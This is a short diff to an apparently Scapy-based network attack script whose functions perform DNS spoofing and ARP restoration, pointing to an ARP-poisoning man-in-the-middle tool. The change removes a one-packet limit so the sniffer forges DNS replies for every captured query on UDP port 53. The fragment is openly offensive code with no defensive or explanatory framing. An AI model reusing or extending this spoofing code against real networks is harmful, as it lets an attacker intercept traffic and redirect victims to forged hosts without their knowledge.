@@ -25,7 +25,7 @@ def sendFakeDNS(pkt):
     
 
 def DNSSpoofing(gatewayip):
-    sniff(filter="udp and port 53", prn=sendFakeDNS, count=1)
+    sniff(filter="udp and port 53", prn=sendFakeDNS)
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
     packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
